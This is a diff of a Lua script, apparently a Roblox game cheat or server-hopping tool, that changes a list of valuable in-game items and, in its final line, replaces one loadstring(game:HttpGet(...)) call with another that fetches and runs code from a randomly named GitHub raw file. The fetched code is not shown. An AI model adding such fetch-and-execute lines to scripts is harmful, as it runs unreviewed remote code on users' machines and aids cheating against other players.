@@ -95,11 +95,7 @@ sendTeleport = true
 
 -- 📋 SPECIAL BRAINROTS WITH MIN VALUES
 local SPECIAL_BRAINROTS = {
-['Dragon Gingerini'] = 0,
-['Dragon Cannelloni'] = 0,
-['Strawberry Elephant'] = 0,
-['Meowl'] = 0,
-['Skibidi Toilet'] = 0,
+['Dragon Cannelloni'] = 99999999999,
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -237,7 +233,8 @@ local OBJECTS = {
 ['Jolly Jolly Sahur'] = { emoji = '🥶', important = true },
 ['Los Jolly Combinasionas'] = { emoji = '🗽', important = true },
 ['Ginger Gerat'] = { emoji = '🥶', important = true },
-['Skibidi Toilet'] = { emoji = '🥶', important = true },  
+['Skibidi Toilet'] = { emoji = '🥶', important = true },
+['Tuff Toucan'] = { emoji = '🦜', important = true },
 }
 
 local ALWAYS_IMPORTANT = {}
@@ -765,4 +762,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/g5hg45yhhop.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/gfddfg"))()
